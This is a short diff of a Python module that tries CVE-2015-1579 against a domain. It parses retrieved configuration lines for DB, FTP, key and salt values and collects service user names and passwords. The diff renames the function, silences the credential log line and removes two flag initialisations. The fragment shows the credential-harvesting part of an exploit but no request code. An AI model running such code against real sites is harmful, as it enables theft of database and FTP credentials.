@@ -3,7 +3,7 @@ import urllib2
 import sys
 from datetime import datetime
 
-def active(domain):
+def passive(domain):
     log.info('Trying CVE-2015-1579')
 
     dico = ['DB','FTP','KEY','SALT','DOMAIN',]
@@ -70,7 +70,7 @@ def active(domain):
                 if term in line and len(line.split("'")) == 5:
                     description = line.split("'")[1]
                     value = line.split("'")[3]
-                    log.success('Found a '+description+" : "+value)
+                    #log.success('Found a '+description+" : "+value)
                     if "USER" in description: 
                         serviceU.append(value)
                     elif "PASS" in description and value not in passwords:
@@ -79,9 +79,6 @@ def active(domain):
                     break
     if len(serviceU) > 0:
         log.success('Found a total of '+str(len(serviceU))+' service users')
-
-    foundUsers = False
-    foundPasswords = False
 
     if len(users) > 0:
         foundUsers = True
@@ -116,3 +113,6 @@ def active(domain):
     if len(retValue) == 0:
         retValue = [("none",False)]
     return retValue
+
+def active(url):
+	return passive(url)
